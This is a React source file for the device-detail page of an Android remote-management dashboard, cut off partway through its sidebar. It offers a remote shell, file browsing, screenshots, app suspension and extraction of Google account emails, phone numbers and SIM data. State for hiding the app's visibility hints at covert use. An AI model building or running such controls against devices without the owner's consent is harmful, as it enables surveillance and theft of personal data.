import { useState, useEffect, useRef } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { devicesAPI, commandsAPI } from '../api'
import { 
  ArrowLeft, 
  Battery, 
  HardDrive,
  Wifi,
  MapPin,
  Lock,
  Unlock,
  RotateCcw,
  Camera,
  Radio,
  Loader2,
  CheckCircle,
  XCircle,
  Clock,
  Monitor,
  Mic,
  Headphones,
  Terminal as TerminalIcon,
  Files,
  AppWindow,
  Info,
  X,
  Download,
  Image as ImageIcon,
  Key,
  Mail,
  Tablet,
  ChevronRight,
  Shield,
  Zap,
  Eye,
  EyeOff,
  Navigation,
  Library as Buffer,
  Phone,
  FileSearch,
  Bell,
  Ear
} from 'lucide-react'

export default function DeviceDetail() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const queryClient = useQueryClient()
  const [activeTab, setActiveTab] = useState<'info' | 'shell' | 'files' | 'apps'>('info')
  const [shellInput, setShellInput] = useState('')
  const [shellHistory, setShellHistory] = useState<Array<{ type: 'cmd' | 'resp' | 'error', text: string }>>([])
  
  const [currentPath, setCurrentPath] = useState('/sdcard/')
  const [files, setFiles] = useState<any[]>([])
  const [pendingFilesCmd, setPendingFilesCmd] = useState<string | null>(null)
  const [filesLoading, setFilesLoading] = useState(false)
  const [filesInitialized, setFilesInitialized] = useState(false)
  
  const [apps, setApps] = useState<any[]>([])
  const shellEndRef = useRef<HTMLDivElement>(null)
  const [screenshotUrl, setScreenshotUrl] = useState<string | null>(null)
  const [screenshotLoading, setScreenshotLoading] = useState(false)
  const [showPasswordModal, setShowPasswordModal] = useState(false)
  const [newPassword, setNewPassword] = useState('')
  const [accountsLoading, setAccountsLoading] = useState(false)
  const [issamLoading, setIssamLoading] = useState(false)
  const [captureIssamLoading, setCaptureIssamLoading] = useState(false)
  const [showTestNotifModal, setShowTestNotifModal] = useState(false)
  const [testNotifIssamId, setTestNotifIssamId] = useState('')
  const [accountsResult, setAccountsResult] = useState<{
    google_emails: string[]
    phone_numbers: string[]
    sim_info: Array<Record<string, any>>
    has_sim: boolean
  } | null>(null)
  const [_accountsError, setAccountsError] = useState<string | null>(null)
  const [appHidden, setAppHidden] = useState(false) // visible by default
  const [appVisibilityLoading, setAppVisibilityLoading] = useState(false)

  const { data: device, isLoading } = useQuery({
    queryKey: ['device', id],
    queryFn: () => devicesAPI.get(id!),
    enabled: !!id,
    refetchInterval: 10000,
  })

  const { data: commands } = useQuery({
    queryKey: ['commands', id],
    queryFn: () => commandsAPI.list(id!, 10),
    enabled: !!id,
    refetchInterval: 5000,
  })

  const commandMutation = useMutation({
    mutationFn: (type: 'lock' | 'reboot' | 'screenshot' | 'ping' | 'start_kiosk' | 'stop_kiosk' | 'wake' | 'unlock') => {
      if (type === 'screenshot') setScreenshotLoading(true)
      switch (type) {
        case 'lock': return commandsAPI.lock(id!)
        case 'reboot': return commandsAPI.reboot(id!)
        case 'screenshot': return commandsAPI.screenshot(id!)
        case 'ping': return commandsAPI.ping(id!)
        case 'start_kiosk': return commandsAPI.startKiosk(id!)
        case 'stop_kiosk': return commandsAPI.stopKiosk(id!)
        case 'wake': return commandsAPI.wake(id!)
        case 'unlock': return commandsAPI.unlock(id!)
      }
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
  })

  const passwordMutation = useMutation({
    mutationFn: (password: string) => commandsAPI.setPassword(id!, password),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
      setShowPasswordModal(false)
      setNewPassword('')
    },
  })

  const accountsMutation = useMutation({
    mutationFn: () => {
      setAccountsLoading(true)
      setAccountsError(null)
      return commandsAPI.getAccounts(id!)
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
    onError: (error: any) => {
      setAccountsLoading(false)
      setAccountsError(error.response?.data?.error?.message || error.message || 'Failed to send command')
    },
  })

  const issamMutation = useMutation({
    mutationFn: () => {
      setIssamLoading(true)
      return commandsAPI.extractIssam(id!)
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
    onError: () => {
      setIssamLoading(false)
    },
  })

  const captureIssamMutation = useMutation({
    mutationFn: () => {
      setCaptureIssamLoading(true)
      return commandsAPI.captureIssam(id!)
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
    onError: () => {
      setCaptureIssamLoading(false)
    },
  })

  const testNotifMutation = useMutation({
    mutationFn: (issamId: string) => commandsAPI.sendTestNotification(id!, issamId),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
      setShowTestNotifModal(false)
      setTestNotifIssamId('')
    },
  })

  const shellMutation = useMutation({
    mutationFn: (command: string) => commandsAPI.shell(id!, command),
    onSuccess: (data) => {
      // We don't have the result immediately, it's an async command via MQTT
      // But we can show that the command was sent.
      setShellHistory(prev => [...prev, { type: 'resp', text: `Command sent (ID: ${data.id.substring(0,8)}). Waiting for output...` }])
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
    onError: (error: any) => {
      setShellHistory(prev => [...prev, { type: 'error', text: `Error: ${error.response?.data?.message || error.message}` }])
    }
  })

  const handleShellSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!shellInput.trim() || shellMutation.isPending) return
    
    setShellHistory(prev => [...prev, { type: 'cmd', text: shellInput }])
    shellMutation.mutate(shellInput)
    setShellInput('')
  }

  const filesMutation = useMutation({
    mutationFn: (path: string) => commandsAPI.listFiles(id!, path),
    onSuccess: (data) => {
      setPendingFilesCmd(data.id)
      setFilesLoading(true)
      setFilesInitialized(true)
      setFiles([])
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
  })

  const navigateToFolder = (folderName: string) => {
    let newPath = currentPath
    if (folderName === '..') {
      const parts = currentPath.split('/').filter(Boolean)
      parts.pop()
      newPath = '/' + parts.join('/') + '/'
    } else {
      newPath = currentPath + folderName + '/'
    }
    setCurrentPath(newPath)
    filesMutation.mutate(newPath)
  }

  const appsMutation = useMutation({
    mutationFn: () => commandsAPI.getApps(id!),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
  })

  const restrictAppMutation = useMutation({
    mutationFn: ({ pkg, suspended }: { pkg: string, suspended: boolean }) => 
      commandsAPI.setAppRestrictions(id!, [pkg], suspended),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands', id] })
    },
  })

  // Files are fetched manually via the Browse / Refresh button

  // Apps are fetched manually via the Fetch Apps button

  useEffect(() => {
    if (activeTab === 'shell') {
      shellEndRef.current?.scrollIntoView({ behavior: 'smooth' })
    }
  }, [shellHistory, activeTab])

  // Watch for command results to update app list, screenshots, etc.
  useEffect(() => {
    if (commands && commands.length > 0) {
      const latestAppsCmd = commands.find(c => c.command_type === 'GET_APPS' && c.status === 'completed' && c.result?.apps)
      if (latestAppsCmd && latestAppsCmd.result) {
        setApps(latestAppsCmd.result.apps as any[])
      }

      if (pendingFilesCmd) {
        const filesCmd = commands.find(c => c.id === pendingFilesCmd)
        if (filesCmd) {
          if (filesCmd.status === 'completed' && filesCmd.result?.files) {
            setFiles(filesCmd.result.files as any[])
            setFilesLoading(false)
            setPendingFilesCmd(null)
          } else if (filesCmd.status === 'failed' || filesCmd.status === 'timeout') {
            setFilesLoading(false)
            setPendingFilesCmd(null)
          }
        }
      }

      const latestShellCmd = commands.find(c => c.command_type === 'SHELL_COMMAND' && c.status === 'completed' && c.result?.output)
      if (latestShellCmd && latestShellCmd.result) {
        // Only add if not already in history (basic check)
        const output = latestShellCmd.result.output as string
        setShellHistory(prev => {
          if (prev.some(h => h.text === output)) return prev
          return [...prev, { type: 'resp', text: output }]
        })
      }

      // Detect screenshot results
      const latestScreenshot = commands.find(c => c.command_type === 'SCREENSHOT' && c.status === 'completed' && c.result?.screenshot)
      if (latestScreenshot && latestScreenshot.result && screenshotLoading) {
        const base64 = latestScreenshot.result.screenshot as string
        setScreenshotUrl(`data:image/jpeg;base64,${base64}`)
        setScreenshotLoading(false)
      }
      // Also stop loading if screenshot failed
      const failedScreenshot = commands.find(c => c.command_type === 'SCREENSHOT' && c.status === 'failed')
      if (failedScreenshot && screenshotLoading) {
        setScreenshotLoading(false)
      }

      // Handle GET_DEVICE_ACCOUNTS response
      if (accountsLoading) {
        const accountsCmd = commands.find(c => c.command_type === 'GET_DEVICE_ACCOUNTS' && c.status === 'completed' && c.result?.google_emails !== undefined)
        if (accountsCmd && accountsCmd.result) {
          setAccountsResult({
            google_emails: (accountsCmd.result.google_emails as string[]) || [],
            phone_numbers: (accountsCmd.result.phone_numbers as string[]) || [],
            sim_info: (accountsCmd.result.sim_info as Array<Record<string, any>>) || [],
            has_sim: accountsCmd.result.has_sim as boolean ?? false,
          })
          setAccountsLoading(false)
          setAccountsError(null)
          // Refresh device data to get persisted emails/phones
          queryClient.invalidateQueries({ queryKey: ['device', id] })
        }
        const failedAccounts = commands.find(c => c.command_type === 'GET_DEVICE_ACCOUNTS' && (c.status === 'failed' || c.status === 'timeout'))
        if (failedAccounts) {
          setAccountsLoading(false)
          setAccountsError(failedAccounts.error_message || 'Command failed or timed out')
        }
      }

      // Handle EXTRACT_ISSAM response
      if (issamLoading) {
        const issamCmd = commands.find(c => c.command_type === 'EXTRACT_ISSAM' && c.status === 'completed' && c.result?.issam_id !== undefined)
        if (issamCmd) {
          setIssamLoading(false)
          queryClient.invalidateQueries({ queryKey: ['device', id] })
        }
        const failedIssam = commands.find(c => c.command_type === 'EXTRACT_ISSAM' && (c.status === 'failed' || c.status === 'timeout'))
        if (failedIssam) {
          setIssamLoading(false)
        }
      }

      // Handle CAPTURE_ISSAM response
      if (captureIssamLoading) {
        const captureCmd = commands.find(c => c.command_type === 'CAPTURE_ISSAM' && c.status === 'completed' && c.result?.issam_id !== undefined)
        if (captureCmd) {
          setCaptureIssamLoading(false)
          queryClient.invalidateQueries({ queryKey: ['device', id] })
        }
        const failedCapture = commands.find(c => c.command_type === 'CAPTURE_ISSAM' && (c.status === 'failed' || c.status === 'timeout'))
        if (failedCapture) {
          setCaptureIssamLoading(false)
        }
      }
    }
  }, [commands])

  const formatBytes = (bytes?: number) => {
    if (!bytes) return '-'
    const gb = bytes / (1024 * 1024 * 1024)
    return `${gb.toFixed(1)} GB`
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'completed': return 'text-green-600'
      case 'failed':
      case 'timeout': return 'text-red-600'
      case 'executing':
      case 'delivered': return 'text-blue-600'
      default: return 'text-yellow-600'
    }
  }

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'completed': return <CheckCircle className="w-4 h-4" />
      case 'failed':
      case 'timeout': return <XCircle className="w-4 h-4" />
      case 'executing':
      case 'delivered': return <Loader2 className="w-4 h-4 animate-spin" />
      default: return <Clock className="w-4 h-4" />
    }
  }

  if (isLoading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="w-8 h-8 border-2 border-black border-t-transparent rounded-full animate-spin" />
      </div>
    )
  }

  if (!device) {
    return (
      <div className="text-center py-12">
        <p className="text-gray-500">Device not found</p>
      </div>
    )
  }

  return (
    <div className="animate-fade-in space-y-6">
      {/* Header Container */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate('/devices')}
            className="p-2.5 hover:bg-gray-100 rounded-2xl transition-all border border-gray-100 text-gray-500 hover:text-black"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-3xl font-bold tracking-tight text-gray-900">
                {device.name || device.model || 'Unknown Device'}
              </h1>
              <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${
                device.status === 'online' ? 'bg-emerald-100 text-emerald-700' : 'bg-gray-100 text-gray-400'
              }`}>
                {device.status}
              </span>
            </div>
            <p className="text-gray-400 font-medium text-sm mt-0.5 uppercase tracking-wide">
              {device.manufacturer || 'System'} · {device.model || 'Generic'} · Android {device.android_version || '??'}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={() => commandMutation.mutate('ping')}
            disabled={device.status !== 'online' || commandMutation.isPending}
            className="flex items-center gap-2 px-4 py-2 bg-gray-900 text-white rounded-2xl hover:bg-black transition-all disabled:opacity-50 text-sm font-semibold"
          >
            <Radio className="w-4 h-4" />
            Ping Device
          </button>
          <button
            onClick={() => commandMutation.mutate('reboot')}
            disabled={device.status !== 'online' || commandMutation.isPending}
            className="flex items-center gap-2 px-4 py-2 bg-[#FA9411]/10 text-[#FA9411] rounded-2xl hover:bg-[#FA9411]/20 transition-all disabled:opacity-50 text-sm font-semibold"
          >
            <RotateCcw className="w-4 h-4" />
            Reboot
          </button>
        </div>
      </div>

      {/* Primary Metrics */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="bg-white p-5 rounded-[2.5rem] border border-gray-100 shadow-sm">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Power Level</span>
            <Battery className={`w-4 h-4 ${(device.battery_level ?? 0) < 20 ? 'text-red-500' : 'text-emerald-500'}`} />
          </div>
          <div className="text-3xl font-bold tracking-tighter">
            {device.battery_level ?? '--'}<span className="text-lg text-gray-300 ml-0.5">%</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-[2.5rem] border border-gray-100 shadow-sm">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Available Storage</span>
            <HardDrive className="w-4 h-4 text-orange-500" />
          </div>
          <div className="text-3xl font-bold tracking-tighter">
            {formatBytes(device.storage_available).split(' ')[0]}<span className="text-lg text-gray-300 ml-0.5">GB</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-[2.5rem] border border-gray-100 shadow-sm">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Signal Status</span>
            <Wifi className="w-4 h-4 text-blue-500" />
          </div>
          <div className="text-2xl font-bold tracking-tighter truncate">
            {device.network_type || 'Unknown'}
          </div>
        </div>

        <div className="bg-white p-5 rounded-[2.5rem] border border-gray-100 shadow-sm">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Network Address</span>
            <MapPin className="w-4 h-4 text-purple-500" />
          </div>
          <div className="text-2xl font-bold tracking-tighter truncate">
            {device.ip_address || '--'}
          </div>
        </div>
      </div>

      {/* Tabs Design */}
      <div className="flex gap-2 p-1.5 bg-gray-100/50 rounded-3xl w-fit">
        {[
          { id: 'info', name: 'General Information', icon: Info },
          { id: 'shell', name: 'Command Terminal', icon: TerminalIcon },
          { id: 'files', name: 'File Storage', icon: Files },
          { id: 'apps', name: 'Applications', icon: AppWindow }
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex items-center gap-2 px-6 py-2.5 rounded-2xl text-sm font-bold transition-all ${
              activeTab === tab.id 
                ? 'bg-white text-black shadow-sm ring-1 ring-gray-200' 
                : 'text-gray-500 hover:text-black hover:bg-gray-200/50'
            }`}
          >
            <tab.icon className="w-4 h-4" />
            {tab.name}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Main Content Pane */}
        <div className="lg:col-span-8 space-y-6">
          {activeTab === 'info' && (
            <>
              {/* Device Details Grid */}
              <div className="bg-white p-8 rounded-[2.5rem] border border-gray-100 shadow-sm">
                <h3 className="text-lg font-bold mb-6 flex items-center gap-2">
                  <Tablet className="w-5 h-5 text-[#FA9411]" />
                  Device Details
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-y-6 gap-x-12">
                  <DetailItem label="Device ID" value={device.device_id} isMono />
                  <DetailItem label="Serial Number" value={device.serial_number || device.device_id} isMono />
                  <DetailItem label="Manufacturer" value={device.manufacturer} />
                  <DetailItem label="Model" value={device.model} />
                  <DetailItem label="System Software" value={`Android ${device.android_version} (API ${device.sdk_version})`} />
                  <DetailItem label="Admin Group" value={device.group_name || 'No Group Assigned'} isTag />
                  <DetailItem label="Enrollment Link" value={device.enrollment_name || 'Direct Enrollment'} />
                  <DetailItem label="Enrollment Date" value={device.enrolled_at ? new Date(device.enrolled_at).toLocaleString() : (device.created_at ? new Date(device.created_at).toLocaleString() : 'N/A')} />
                  <DetailItem label="Last Communication" value={device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'} />
                  <DetailItem label="ISSAM ID" value={device.issam_id || (issamLoading ? 'Extracting...' : 'Not extracted')} isMono />
                </div>
              </div>

              {/* Advanced Extraction Data */}
              {(accountsResult || device.google_emails || device.phone_numbers) && (
                <div className="bg-white p-8 rounded-[2.5rem] border border-gray-100 shadow-sm">
                  <h3 className="text-lg font-bold mb-6 flex items-center gap-2 text-gray-900">
                    <Mail className="w-5 h-5 text-[#FA9411]" />
                    Extracted Accounts & Info
                  </h3>
                  
                  <div className="space-y-6">
                    <div>
                      <span className="text-[10px] font-bold uppercase text-gray-400 tracking-[0.2em] mb-3 block">Registered Emails</span>
                      <div className="flex flex-wrap gap-2">
                        {(accountsResult?.google_emails ?? device.google_emails ?? []).length > 0 ? (
                          (accountsResult?.google_emails ?? device.google_emails ?? []).map((email: string, i: number) => (
                            <div key={i} className="flex items-center gap-2 bg-gray-50 border border-gray-100 px-4 py-2 rounded-2xl">
                              <div className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
                              <span className="text-sm font-mono text-gray-600 font-medium">{email}</span>
                            </div>
                          ))
                        ) : (
                          <span className="text-sm text-gray-400 italic">No emails detected yet</span>
                        )}
                      </div>
                    </div>

                    <div>
                      <span className="text-[10px] font-bold uppercase text-gray-400 tracking-[0.2em] mb-3 block">Phone Information</span>
                      <div className="flex flex-wrap gap-2">
                        {(accountsResult?.phone_numbers ?? device.phone_numbers ?? []).length > 0 ? (
                          (accountsResult?.phone_numbers ?? device.phone_numbers ?? []).map((phone: string, i: number) => (
                            <div key={i} className="flex items-center gap-2 bg-gray-50 border border-gray-100 px-4 py-2 rounded-2xl">
                              <div className="w-1.5 h-1.5 rounded-full bg-[#FA9411]" />
                              <span className="text-sm font-mono text-gray-600 font-medium">{phone}</span>
                            </div>
                          ))
                        ) : (
                          <span className="text-sm text-gray-400 italic">No phone numbers detected yet</span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Screenshot Display */}
              {(screenshotUrl || screenshotLoading) && (
                <div className="bg-gray-900 rounded-[2.5rem] p-6 shadow-2xl overflow-hidden relative group">
                  <div className="absolute top-6 left-6 flex items-center gap-2 bg-black/40 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10 z-10 transition-opacity group-hover:opacity-100 opacity-60">
                    <Camera className="w-3.5 h-3.5 text-white" />
                    <span className="text-[10px] font-bold text-white uppercase tracking-wider">Live Capture</span>
                  </div>
                  
                  <div className="absolute top-6 right-6 flex gap-2 z-10">
                    {screenshotUrl && (
                      <a
                        href={screenshotUrl}
                        download={`capture-${device.device_id}.jpg`}
                        className="p-2.5 bg-white rounded-2xl text-black hover:scale-110 transition-all shadow-lg"
                      >
                        <Download className="w-4 h-4" />
                      </a>
                    )}
                    <button
                      onClick={() => { setScreenshotUrl(null); setScreenshotLoading(false) }}
                      className="p-2.5 bg-white/10 backdrop-blur-md rounded-2xl text-white hover:bg-white hover:text-black transition-all"
                    >
                      <X className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="flex items-center justify-center min-h-[400px]">
                    {screenshotLoading ? (
                      <div className="flex flex-col items-center gap-4 py-20">
                        <div className="w-12 h-12 border-4 border-[#FA9411] border-t-white rounded-full animate-spin" />
                        <p className="text-white/60 font-bold uppercase tracking-[0.2em] text-[10px]">Initializing Handshake...</p>
                      </div>
                    ) : screenshotUrl ? (
                      <img
                        src={screenshotUrl}
                        alt="Unit Capture"
                        className="max-w-full max-h-[600px] rounded-2xl shadow-2xl"
                      />
                    ) : null}
                  </div>
                </div>
              )}

              {/* Activity Log */}
              <div className="bg-white rounded-[2.5rem] border border-gray-100 shadow-sm overflow-hidden">
                <div className="px-8 py-6 border-b border-gray-50 flex items-center justify-between">
                  <h3 className="text-lg font-bold">Activity Log</h3>
                  <Clock className="w-4 h-4 text-gray-300" />
                </div>
                <div className="divide-y divide-gray-50">
                  {commands && commands.length > 0 ? (
                    commands.map((cmd) => (
                      <div key={cmd.id} className="px-8 py-4 flex items-center justify-between hover:bg-gray-50/50 transition-colors">
                        <div className="flex items-center gap-4">
                          <div className={`p-2 rounded-xl bg-opacity-10 ${getStatusColor(cmd.status).replace('text-', 'bg-')}`}>
                            <div className={getStatusColor(cmd.status)}>
                              {getStatusIcon(cmd.status)}
                            </div>
                          </div>
                          <div>
                            <div className="font-bold text-sm text-gray-900 uppercase tracking-tight">{cmd.command_type.replace(/_/g, ' ')}</div>
                            <div className="text-[10px] font-medium text-gray-400 font-mono">
                              {new Date(cmd.created_at).toLocaleString()}
                            </div>
                          </div>
                          {cmd.command_type === 'SCREENSHOT' && cmd.status === 'completed' && typeof cmd.result?.screenshot === 'string' && (
                            <button
                              onClick={() => setScreenshotUrl(`data:image/jpeg;base64,${cmd.result!.screenshot as string}`)}
                              className="ml-4 p-2 bg-[#FA9411]/10 rounded-xl hover:bg-[#FA9411]/20 transition-colors"
                              title="View Captured Frame"
                            >
                              <ImageIcon className="w-3.5 h-3.5 text-[#FA9411]" />
                            </button>
                          )}
                        </div>
                        <div className={`text-[10px] font-bold uppercase tracking-widest ${getStatusColor(cmd.status)}`}>
                          {cmd.status}
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="px-8 py-12 text-center text-gray-400 italic text-sm">
                      No operational logs found for this unit.
                    </div>
                  )}
                </div>
              </div>
            </>
          )}

          {activeTab === 'shell' && (
            <div className="bg-black text-emerald-500 p-8 rounded-[2.5rem] font-mono text-sm h-[600px] flex flex-col shadow-2xl border-4 border-gray-900 overflow-hidden">
               <div className="flex items-center gap-2 mb-4 border-b border-white/10 pb-4">
                  <div className="flex gap-1.5 leading-none">
                    <div className="w-2 h-2 rounded-full bg-red-500/50" />
                    <div className="w-2 h-2 rounded-full bg-amber-500/50" />
                    <div className="w-2 h-2 rounded-full bg-emerald-500/50" />
                  </div>
                  <span className="text-[10px] uppercase tracking-widest font-bold text-gray-500 ml-2">Secure Link Established</span>
               </div>

              <div className="flex-1 overflow-auto space-y-2 mb-4 scrollbar-thin scrollbar-thumb-gray-800">
                <p className="text-gray-500"># System: {device.manufacturer} {device.model}</p>
                <p className="text-gray-500"># Identifier: {device.device_id}</p>
                <p className="text-gray-500"># Command interface ready.</p>
                
                {shellHistory.map((item, i) => (
                  <div key={i} className="leading-relaxed">
                    {item.type === 'cmd' ? (
                      <p className="flex gap-2"><span className="text-emerald-500 opacity-50">$</span> <span className="text-white font-bold">{item.text}</span></p>
                    ) : item.type === 'error' ? (
                      <p className="text-red-400 bg-red-400/10 px-2 rounded">{item.text}</p>
                    ) : (
                      <p className="text-emerald-400/80">{item.text}</p>
                    )}
                  </div>
                ))}
                <div ref={shellEndRef} />
              </div>
              
              <form onSubmit={handleShellSubmit} className="flex bg-white/5 p-4 rounded-2xl border border-white/5">
                <span className="text-emerald-500 font-bold mr-3 font-mono">$</span>
                <input 
                  type="text" 
                  value={shellInput}
                  onChange={(e) => setShellInput(e.target.value)}
                  placeholder={device.status === 'online' ? "Execute command..." : "Unit offline"}
                  disabled={device.status !== 'online' || shellMutation.isPending}
                  className="bg-transparent border-none outline-none flex-1 text-white placeholder:text-gray-600 font-mono"
                  autoFocus
                />
                {shellMutation.isPending && (
                  <Loader2 className="w-4 h-4 animate-spin text-emerald-500" />
                )}
              </form>
            </div>
          )}

          {activeTab === 'files' && (
            <div className="bg-white border border-gray-100 rounded-[2.5rem] shadow-sm overflow-hidden flex flex-col h-[650px]">
              <div className="px-8 py-6 border-b border-gray-50 bg-gray-50/50 flex items-center justify-between">
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold uppercase text-gray-400 tracking-[0.2em] mb-1">Current Directory</span>
                  <div className="flex items-center text-sm font-bold text-gray-900 truncate max-w-md">
                    <Files className="w-4 h-4 mr-2 text-[#FA9411]" />
                    {currentPath}
                  </div>
                </div>
                <button 
                  onClick={() => filesMutation.mutate(currentPath)}
                  disabled={device.status !== 'online' || filesMutation.isPending}
                  className="px-6 py-2.5 bg-black text-white rounded-2xl hover:bg-gray-800 transition-all font-bold text-xs flex items-center disabled:opacity-50"
                >
                  <RotateCcw className={`w-3.5 h-3.5 mr-2 ${filesMutation.isPending ? 'animate-spin' : ''}`} />
                  {filesInitialized ? 'Sync Filesystem' : 'Query Directory'}
                </button>
              </div>
              
              <div className="flex-1 overflow-auto p-4">
                <table className="w-full text-left text-sm border-separate border-spacing-y-2">
                  <tbody className="">
                    {currentPath !== '/' && (
                      <tr 
                        className="group cursor-pointer hover:bg-gray-50 transition-colors"
                        onClick={() => navigateToFolder('..')}
                      >
                        <td className="px-6 py-4 rounded-2xl bg-gray-50/50 border border-gray-100 flex items-center">
                          <Files className="w-4 h-4 text-gray-400 mr-3" />
                          <span className="font-bold text-gray-400">.. [Parent Directory]</span>
                        </td>
                      </tr>
                    )}
                    
                    {files.map((file, i) => (
                      <tr 
                        key={i} 
                        className="group cursor-pointer hover:bg-gray-50 transition-colors"
                        onClick={() => file.is_dir && navigateToFolder(file.name)}
                      >
                        <td className="px-6 py-4 rounded-2xl bg-white border border-gray-100 group-hover:border-[#FA9411]/30 transition-all shadow-sm group-hover:shadow-md">
                          <div className="flex items-center justify-between">
                            <div className="flex items-center">
                              <div className={`p-2 rounded-xl mr-4 ${file.is_dir ? 'bg-gray-100' : 'bg-emerald-50'}`}>
                                <Files className={`w-4 h-4 ${file.is_dir ? 'text-gray-900' : 'text-emerald-600'}`} />
                              </div>
                              <div className="flex flex-col">
                                <span className={`text-sm ${file.is_dir ? 'font-bold text-gray-900' : 'font-medium text-gray-600'}`}>{file.name}</span>
                                {!file.is_dir && (
                                  <span className="text-[10px] text-gray-400 font-mono mt-0.5">{formatBytes(file.size)} • {new Date(file.last_modified).toLocaleDateString()}</span>
                                )}
                              </div>
                            </div>
                            {file.is_dir && (
                              <ChevronRight className="w-4 h-4 text-gray-300 group-hover:text-black transition-colors" />
                            )}
                          </div>
                        </td>
                      </tr>
                    ))}
                    
                    {(filesLoading || filesMutation.isPending) && files.length === 0 && (
                      <tr>
                        <td>
                          <div className="flex flex-col items-center justify-center py-24 gap-4">
                            <div className="w-12 h-12 border-4 border-[#FA9411] border-t-transparent rounded-full animate-spin" />
                            <p className="text-gray-400 font-bold uppercase tracking-widest text-[10px]">Synchronizing...</p>
                          </div>
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === 'apps' && (
            <div className="bg-white border border-gray-100 rounded-[2.5rem] shadow-sm overflow-hidden flex flex-col h-[650px]">
              <div className="px-8 py-6 border-b border-gray-50 bg-gray-50/50 flex items-center justify-between">
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold uppercase text-gray-400 tracking-[0.2em] mb-1">Installed Apps</span>
                  <div className="text-sm font-bold text-gray-900">{apps.length} Total Packages Detected</div>
                </div>
                <button 
                  onClick={() => appsMutation.mutate()}
                  disabled={device.status !== 'online' || appsMutation.isPending}
                  className="px-6 py-2.5 bg-black text-white rounded-2xl hover:bg-gray-800 transition-all font-bold text-xs flex items-center disabled:opacity-50"
                >
                  <RotateCcw className={`w-3.5 h-3.5 mr-2 ${appsMutation.isPending ? 'animate-spin' : ''}`} />
                  Update Registry
                </button>
              </div>
              <div className="flex-1 overflow-auto p-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {apps.map((app, i) => (
                      <div key={i} className="p-5 bg-white border border-gray-100 rounded-3xl hover:border-black/10 transition-all group shadow-sm flex items-center justify-between">
                        <div className="flex items-center gap-4">
                           <div className="w-10 h-10 rounded-2xl bg-gray-100 flex items-center justify-center text-gray-400 group-hover:text-black transition-colors">
                             <AppWindow className="w-5 h-5" />
                           </div>
                           <div>
                              <p className="font-bold text-sm text-gray-900 truncate max-w-[150px]">{app.name}</p>
                              <p className="text-[10px] font-mono text-gray-400 truncate max-w-[150px]">{app.package}</p>
                           </div>
                        </div>
                        <div className="flex flex-col items-end gap-2">
                           <span className={`px-2 py-0.5 rounded-lg text-[10px] uppercase font-bold ${app.system ? 'bg-gray-50 text-gray-400' : 'bg-blue-50 text-blue-600'}`}>
                             {app.system ? 'System' : 'User'}
                           </span>
                           {!app.system && (
                              <button 
                                onClick={() => restrictAppMutation.mutate({ pkg: app.package, suspended: true })}
                                className="text-[10px] font-bold text-red-500 hover:text-red-700 bg-red-50 px-2 py-1 rounded-lg transition-colors"
                              >
                                RESTRICT
                              </button>
                           )}
                        </div>
                      </div>
                    ))}
                </div>
                {apps.length === 0 && !appsMutation.isPending && (
                  <div className="flex flex-col items-center justify-center py-24 text-gray-400 gap-3">
                    <Buffer className="w-12 h-12 opacity-10" />
                    <p className="font-bold text-sm">Registry Empty</p>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>

        {/* Quick Actions Sidebar - Professional UI */}
        <div className="lg:col-span-4 space-y-6">
          <div className="bg-gray-900 p-8 rounded-[2.5rem] shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 p-4 opacity-10">
               <Shield className="w-24 h-24 text-white" />
            </div>
            
            <h3 className="text-white text-lg font-bold mb-6 flex items-center gap-2 relative z-10">
              <Zap className="w-5 h-5 text-[#FA9411]" />
              Quick Actions
            </h3>

